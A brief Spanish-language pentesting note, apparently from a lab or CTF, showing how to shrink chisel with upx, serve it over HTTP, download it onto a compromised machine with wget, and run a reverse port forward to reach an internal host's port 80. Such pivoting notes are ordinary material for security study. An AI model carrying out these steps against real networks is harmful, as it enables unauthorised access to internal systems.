Descargamos chisel de su repo oficial

Chisel    https://github.com/jpillora/chisel 


```
Lo descomprimimos

gunzip chisel_1.11.3_linux_amd64.gz

$ du -hc chisel_1.11.3_linux_amd64 
9.8M    chisel_1.11.3_linux_amd64
9.8M    total


Lo hacems mas pequeno 

upx chisel_1.11.3_linux_amd64

Montamos un servidor para descargarlo en la maquina intermedia

python3 -m http.server 80


Lo descargamos en la maquina

bash-5.0# wget http://192.168.1.108/chisel

Le damos permisos de ejecucion
chmod +x chisel

Levantamos en nuestro equipo un servidor 
./chisel server

En la maquina objetivo lo ponemos como cliente para que nos entregue los puertos de la 2 maquina como si estuviera en la nuestra

                Servidor chisel         Maquina Obj
./chisel client 192.168.1.108:1234 R:80:10.10.0.129:80
```